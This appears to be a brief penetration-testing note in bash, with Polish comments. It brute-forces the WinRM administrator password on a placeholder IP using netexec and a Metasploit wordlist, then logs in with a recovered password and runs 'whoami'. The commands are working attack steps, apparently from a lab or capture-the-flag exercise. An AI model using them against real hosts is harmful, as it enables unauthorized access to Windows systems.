```bash
# Bruteforce 
$ netexec winrm <IP> -u administrator -p /usr/share/wordlist/metasploit/common_passwords.txt
# logowanie jako użytkownik 
$ netexec winrm <IP> -u administrator -p tinkerbel -x "whoami"
```